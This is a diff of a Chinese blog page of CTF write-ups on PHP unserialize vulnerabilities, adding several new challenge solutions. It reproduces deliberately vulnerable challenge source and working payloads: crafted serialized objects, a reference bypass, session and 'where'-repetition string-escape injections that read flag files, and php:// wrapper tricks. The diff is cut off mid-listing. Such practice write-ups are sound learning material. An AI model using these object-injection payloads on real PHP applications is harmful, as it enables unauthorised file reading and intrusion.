@@ -485,21 +485,21 @@ serialize()将一个对象转换成一个字符串，unserialize()将字符串�
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-03-28
+                    2022-07-28
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.7k
+                    6.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    11 分
+                    31 分
                 </div>
                 
 
@@ -564,8 +564,8 @@ __unset()在不可访问的属性上使用unset()时触发</code></pre>
 <pre class="language-css" data-language="css"><code class="language-css"><span class="token property">s</span><span class="token punctuation">:</span>4<span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span> -> <span class="token property">S</span><span class="token punctuation">:</span>4<span class="token punctuation">:</span><span class="token string">"use\72"</span><span class="token punctuation">;</span></code></pre>
 
 <p>3、深浅copy：在 php中如果我们使用 &amp; 对变量A的值指向变量B，这个时候是属于浅拷贝，当变量B改变时，变量A也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。<br> 4、配合PHP伪协议实现文件包含、命令执行等漏洞。</p>
-<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>先贴俩之前写的简单的</p>
-<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501204543745.png" alt="image-20210501204543745"></p>
+<h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><p>(这里放一下自己做过的反序列化题，持续更新.jpg</p>
+<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501204543745.png" alt="image-20210501204543745"></p>
 <p>看见file_get_contents(),利用伪协议data://text/plain;base64绕过</p>
 <p>再利用php://filter读取useless内的内容</p>
 <p>解码后</p>
@@ -578,7 +578,7 @@ __unset()在不可访问的属性上使用unset()时触发</code></pre>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501205224647.png" alt="image-20210501205224647"></p>
 <p>查看源码找到flag</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501205239104.png" alt="image-20210501205239104"></p>
-<h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>页面中提示有备份文件，御剑扫一遍</p>
+<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>页面中提示有备份文件，御剑扫一遍</p>
 <p>找到存在<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220739803.png" alt="image-20210501220739803"></p>
 <p>重点在class.php和index.php中</p>
@@ -590,7 +590,7 @@ __unset()在不可访问的属性上使用unset()时触发</code></pre>
 <p>所以有隐藏的空格符</p>
 <p>select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot;</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220212731.png" alt="image-20210501220212731"></p>
-<h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><p>题目源码</p>
+<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>题目源码</p>
 <pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;
     protected  $var;
     public function append($value)&#123;
@@ -689,7 +689,7 @@ echo urlencode(serialize($b));</code></pre>
 
 <p>base64解码拿到flag</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210704003713873.png" alt="image-20210704003713873"></p>
-<h3 id="CODE-REVIEW"><a href="#CODE-REVIEW" class="headerlink" title="CODE REVIEW"></a>CODE REVIEW</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705135850186.png" alt="image-20210705135850186"></p>
+<h2 id="CODE-REVIEW"><a href="#CODE-REVIEW" class="headerlink" title="CODE REVIEW"></a>CODE REVIEW</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705135850186.png" alt="image-20210705135850186"></p>
 <p>代码审计可以看出这里首先要先get进pleaseget=1然后post进pleasepost，md51，md52和obj四个值，而obj这里存在反序列化的漏洞</p>
 <p>且当if($this-&gt;correct === $this-&gt;input)成立时就会打印出flag</p>
 <p>这里同时要求传入的md51和md52的md5值相等，且自身不相等，由于md5不能处理数组，所以传入数组的返回值都为null</p>
@@ -704,7 +704,7 @@ echo urlencode(serialize($b));</code></pre>
 <p>post内容为：pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;}</p>
 <p>拿到flag</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705141616910.png" alt="image-20210705141616910"></p>
-<h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h3><p>源码</p>
+<h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>源码</p>
 <pre class="language-php" data-language="php"><code class="language-php">&lt;?php
 
 include(&quot;flag.php&quot;);
@@ -800,10 +800,572 @@ if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150240715.png" alt="image-20210705150240715"></p>
 <p>接下来base64解码就可以拿到flag了</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150647307.png" alt="image-20210705150647307"></p>
-<p>这周划水了（</p>
-<p>忙着学科目三了，周三考完试再补点（</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210704004536648.png" alt="image-20210704004536648"></p>
+<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>代码审计</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
 
+$function &#x3D; @$_GET[&#39;f&#39;];
+
+function filter($img)&#123;
+  $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
+  $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;
+  return preg_replace($filter,&#39;&#39;,$img);
+&#125;
+
+
+if($_SESSION)&#123;
+  unset($_SESSION);
+&#125;
+
+$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;
+$_SESSION[&#39;function&#39;] &#x3D; $function;
+
+extract($_POST);
+
+if(!$function)&#123;
+  echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;
+&#125;
+
+if(!$_GET[&#39;img_path&#39;])&#123;
+  $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);
+&#125;else&#123;
+  $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));
+&#125;
+
+$serialize_info &#x3D; filter(serialize($_SESSION));
+
+if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;
+  highlight_file(&#39;index.php&#39;);
+&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;
+  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!
+&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;
+  $userinfo &#x3D; unserialize($serialize_info);
+  echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));
+  &#125;</code></pre>
+
+<p>phpinfo里有东西，可以先看看</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210812234826151.png" alt="image-20210812234826151"></p>
+<p>接下来我们应该开始想怎么让</p>
+<p>base64_decode($userinfo[&#39;img&#39;])的值等于flag的文件名</p>
+<p><strong>知识点</strong></p>
+<ul>
+<li>反序列化中的对象逃逸</li>
+<li>extract()变量覆盖</li>
+</ul>
+<p><strong>extract()变量覆盖</strong></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813004733910.png" alt="image-20210813004733910"></p>
+<p>但是这里我们不能直接给img赋值，因为img赋值发生在extract之后</p>
+<p><strong>反序列化中的对象逃逸</strong></p>
+<p><strong>键值逃逸</strong></p>
+<ul>
+<li>因为序列化的字符串是严格的，对应的格式不能错，比如s:4:“name”,那s:4就必须有一个字符串长度是4的否则就往后要。</li>
+<li>并且反序列化会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号<code>&#123;&#125;</code>外的就都被扔掉。</li>
+</ul>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813005203142.png" alt="image-20210813005203142"></p>
+<p>接下来是构造payload的部分</p>
+<p>首先我们需要构造img属性：</p>
+<p>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;; </p>
+<p>其中的ZDBnM19mMWFnLnBocA==是d0g3_f1ag.php的base64加密的结果然后在这个属性前面随便加上个序列化字符串（只要是合法的就行），比如：</p>
+<p>;s:1:“1”;<br>;s:2:“10”;<br>;s:3:“100”;</p>
+<p>所以payload可以为：</p>
+<pre class="language-php" data-language="php"><code class="language-php">_SESSION[phpflag]&#x3D;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</code></pre>
+
+<p>session中存在phpflag的原因是由于filter函数会将匹配到的值变为空，而phpflag的长度刚好为7</p>
+<p><strong>为7的原因</strong></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813010634981.png" alt="image-20210813010634981"></p>
+<p>但是添加了filter函数来进行过滤之后</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813010753030.png" alt="image-20210813010753030"></p>
+<p>原来的内容变为了</p>
+<pre class="language-none"><code class="language-none">a:1:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</code></pre>
+
+<p>能成功实现读取flag所在文件的命令</p>
+<p>post后</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813011013959.png" alt="image-20210813011013959"></p>
+<p>对/d0g3_fllllllag进行base64编码后为L2QwZzNfZmxsbGxsbGFn</p>
+<p>所以直接把原来的编码替换掉就行</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813011156367.png" alt="image-20210813011156367"></p>
+<p>看是看懂了，但我还是想不到这种payload。。。</p>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44632787/article/details/119185112?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6">安洵杯 2019]easy_serialize_php -------- 反序列化/序列化和代码审计_若丶时光破灭的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h3zh1/p/12732336.html">https://www.cnblogs.com/h3zh1/p/12732336.html</a></p>
+<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>进入后是个登录页面，本来以为是sql注入，试了一下发现没能成功，扫目录扫到<a target="_blank" rel="noopener" href="http://www.zip备份文件/">www.zip备份文件</a></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163607732.png" alt="image-20210903163607732"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903132345413.png" alt="image-20210903132345413"></p>
+<p>访问一下register.php注册个账户就可以登录了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163626344.png" alt="image-20210903163626344"></p>
+<p>再看其他的内容</p>
+<p>profile.php</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+   require_once(&#39;class.php&#39;);
+   if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;
+      die(&#39;Login First&#39;);    
+   &#125;
+   $username &#x3D; $_SESSION[&#39;username&#39;];
+   $profile&#x3D;$user-&gt;show_profile($username);
+   if($profile  &#x3D;&#x3D; null) &#123;
+      header(&#39;Location: update.php&#39;);
+   &#125;
+   else &#123;
+      $profile &#x3D; unserialize($profile);
+      $phone &#x3D; $profile[&#39;phone&#39;];
+      $email &#x3D; $profile[&#39;email&#39;];
+      $nickname &#x3D; $profile[&#39;nickname&#39;];
+      $photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;]));
+?&gt;</code></pre>
+
+<p>class.php</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+require(&#39;config.php&#39;);
+
+class user extends mysql&#123;
+   private $table &#x3D; &#39;users&#39;;
+
+   public function is_exists($username) &#123;
+      $username &#x3D; parent::filter($username);
+
+      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;
+      return parent::select($this-&gt;table, $where);
+   &#125;
+   public function register($username, $password) &#123;
+      $username &#x3D; parent::filter($username);
+      $password &#x3D; parent::filter($password);
+
+      $key_list &#x3D; Array(&#39;username&#39;, &#39;password&#39;);
+      $value_list &#x3D; Array($username, md5($password));
+      return parent::insert($this-&gt;table, $key_list, $value_list);
+   &#125;
+   public function login($username, $password) &#123;
+      $username &#x3D; parent::filter($username);
+      $password &#x3D; parent::filter($password);
+
+      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;
+      $object &#x3D; parent::select($this-&gt;table, $where);
+      if ($object &amp;&amp; $object-&gt;password &#x3D;&#x3D;&#x3D; md5($password)) &#123;
+         return true;
+      &#125; else &#123;
+         return false;
+      &#125;
+   &#125;
+   public function show_profile($username) &#123;
+      $username &#x3D; parent::filter($username);
+
+      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;
+      $object &#x3D; parent::select($this-&gt;table, $where);
+      return $object-&gt;profile;
+   &#125;
+   public function update_profile($username, $new_profile) &#123;
+      $username &#x3D; parent::filter($username);
+      $new_profile &#x3D; parent::filter($new_profile);
+
+      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;
+      return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);
+   &#125;
+   public function __tostring() &#123;
+      return __class__;
+   &#125;
+&#125;
+
+class mysql &#123;
+   private $link &#x3D; null;
+
+   public function connect($config) &#123;
+      $this-&gt;link &#x3D; mysql_connect(
+         $config[&#39;hostname&#39;],
+         $config[&#39;username&#39;], 
+         $config[&#39;password&#39;]
+      );
+      mysql_select_db($config[&#39;database&#39;]);
+      mysql_query(&quot;SET sql_mode&#x3D;&#39;strict_all_tables&#39;&quot;);
+
+      return $this-&gt;link;
+   &#125;
+
+   public function select($table, $where, $ret &#x3D; &#39;*&#39;) &#123;
+      $sql &#x3D; &quot;SELECT $ret FROM $table WHERE $where&quot;;
+      $result &#x3D; mysql_query($sql, $this-&gt;link);
+      return mysql_fetch_object($result);
+   &#125;
+
+   public function insert($table, $key_list, $value_list) &#123;
+      $key &#x3D; implode(&#39;,&#39;, $key_list);
+      $value &#x3D; &#39;\&#39;&#39; . implode(&#39;\&#39;,\&#39;&#39;, $value_list) . &#39;\&#39;&#39;; 
+      $sql &#x3D; &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;
+      return mysql_query($sql);
+   &#125;
+
+   public function update($table, $key, $value, $where) &#123;
+      $sql &#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;;
+      return mysql_query($sql);
+   &#125;
+
+   public function filter($string) &#123;
+      $escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);
+      $escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;
+      $string &#x3D; preg_replace($escape, &#39;_&#39;, $string);
+
+      $safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
+      $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;
+      return preg_replace($safe, &#39;hacker&#39;, $string);
+   &#125;
+   public function __tostring() &#123;
+      return __class__;
+   &#125;
+&#125;
+session_start();
+$user &#x3D; new user();
+$user-&gt;connect($config);</code></pre>
+
+<p>update.php</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+   require_once(&#39;class.php&#39;);
+   if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;
+      die(&#39;Login First&#39;);    
+   &#125;
+   if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123;
+
+      $username &#x3D; $_SESSION[&#39;username&#39;];
+      if(!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))
+         die(&#39;Invalid phone&#39;);
+
+      if(!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;]))
+         die(&#39;Invalid email&#39;);
+      
+      if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)
+         die(&#39;Invalid nickname&#39;);
+
+      $file &#x3D; $_FILES[&#39;photo&#39;];
+      if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)
+         die(&#39;Photo size error&#39;);
+
+      move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]));
+      $profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];
+      $profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];
+      $profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname&#39;];
+      $profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]);
+
+      $user-&gt;update_profile($username, serialize($profile));
+      echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;;
+   &#125;
+   else &#123;
+?&gt;</code></pre>
+
+<p>config.php</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+   $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;
+   $config[&#39;username&#39;] &#x3D; &#39;root&#39;;
+   $config[&#39;password&#39;] &#x3D; &#39;&#39;;
+   $config[&#39;database&#39;] &#x3D; &#39;&#39;;
+   $flag &#x3D; &#39;&#39;;
+?&gt;</code></pre>
+
+<p>profile里有个file_get_content函数可能有文件读取漏洞，而flag在config.php中，就要让photo=config.php，这里可以利用前边的$profile = unserialize($profile);</p>
+<p>所以再根据</p>
+<pre class="language-none"><code class="language-none">$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
+     $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;
+     return preg_replace($safe, &#39;hacker&#39;, $string);
+  &#125;</code></pre>
+
+<p>可以进行反序列化字符逃逸</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903162948758.png" alt="image-20210903162948758"></p>
+<pre class="language-none"><code class="language-none">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre>
+
+<p>这里这个过滤可以利用抓包将nickename改成数组类型来绕过</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163055572.png" alt="image-20210903163055572"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220516175618670.png" alt="image-20220516175618670"></p>
+<p>看一下这个your profile页面</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163211494.png" alt="image-20210903163211494"></p>
+<p>看一下这个图片的源码，是个base64加密的内容，进行解密后可以得到flag</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163313640.png" alt="image-20210903163313640"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163322131.png" alt="image-20210903163322131"></p>
+<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>文件上传，但是这个flie参数感觉可以直接文件读取</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125203202419.png" alt="image-20211125203202419"></p>
+<p>index.php</p>
+<pre class="language-none"><code class="language-none">&lt;?php 
+header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  
+include &#39;base.php&#39;;
+?&gt; </code></pre>
+
+<p>base.php</p>
+<pre class="language-none"><code class="language-none">&lt;?php 
+    session_start(); 
+?&gt; 
+&lt;!DOCTYPE html&gt; 
+&lt;html&gt; 
+&lt;head&gt; 
+    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; 
+    &lt;title&gt;web3&lt;&#x2F;title&gt; 
+    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot;&gt; 
+    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;jquery&#x2F;2.1.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt; 
+    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt; 
+&lt;&#x2F;head&gt; 
+&lt;body&gt; 
+    &lt;nav class&#x3D;&quot;navbar navbar-default&quot; role&#x3D;&quot;navigation&quot;&gt; 
+        &lt;div class&#x3D;&quot;container-fluid&quot;&gt; 
+        &lt;div class&#x3D;&quot;navbar-header&quot;&gt; 
+            &lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;index.php&quot;&gt;首页&lt;&#x2F;a&gt; 
+        &lt;&#x2F;div&gt; 
+            &lt;ul class&#x3D;&quot;nav navbar-nav navbra-toggle&quot;&gt; 
+                &lt;li class&#x3D;&quot;active&quot;&gt;&lt;a href&#x3D;&quot;file.php?file&#x3D;&quot;&gt;查看文件&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; 
+                &lt;li&gt;&lt;a href&#x3D;&quot;upload_file.php&quot;&gt;上传文件&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; 
+            &lt;&#x2F;ul&gt; 
+            &lt;ul class&#x3D;&quot;nav navbar-nav navbar-right&quot;&gt; 
+                &lt;li&gt;&lt;a href&#x3D;&quot;index.php&quot;&gt;&lt;span class&#x3D;&quot;glyphicon glyphicon-user&quot;&gt;&lt;&#x2F;span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; 
+            &lt;&#x2F;ul&gt; 
+        &lt;&#x2F;div&gt; 
+    &lt;&#x2F;nav&gt; 
+&lt;&#x2F;body&gt; 
+&lt;&#x2F;html&gt; 
+&lt;!--flag is in f1ag.php--&gt;</code></pre>
+
+<p>file.php</p>
+<pre class="language-none"><code class="language-none">&lt;?php 
+header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  
+include &#39;function.php&#39;; 
+include &#39;class.php&#39;; 
+ini_set(&#39;open_basedir&#39;,&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;); 
+$file &#x3D; $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; 
+if(empty($file)) &#123; 
+    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2&#x2F;&gt;&quot;; 
+&#125; 
+$show &#x3D; new Show(); 
+if(file_exists($file)) &#123; 
+    $show-&gt;source &#x3D; $file; 
+    $show-&gt;_show(); 
+&#125; else if (!empty($file))&#123; 
+    die(&#39;file doesn\&#39;t exists.&#39;); 
+&#125; 
+?&gt; </code></pre>
+
+<p>upload_file.php</p>
+<pre class="language-none"><code class="language-none">&lt;?php 
+include &#39;function.php&#39;; 
+upload_file(); 
+?&gt; 
+&lt;html&gt; 
+&lt;head&gt; 
+&lt;meta charest&#x3D;&quot;utf-8&quot;&gt; 
+&lt;title&gt;文件上传&lt;&#x2F;title&gt; 
+&lt;&#x2F;head&gt; 
+&lt;body&gt; 
+&lt;div align &#x3D; &quot;center&quot;&gt; 
+        &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;&#x2F;h1&gt; 
+&lt;&#x2F;div&gt; 
+&lt;style&gt; 
+    p&#123; margin:0 auto&#125; 
+&lt;&#x2F;style&gt; 
+&lt;div&gt; 
+&lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; 
+    &lt;label for&#x3D;&quot;file&quot;&gt;文件名:&lt;&#x2F;label&gt; 
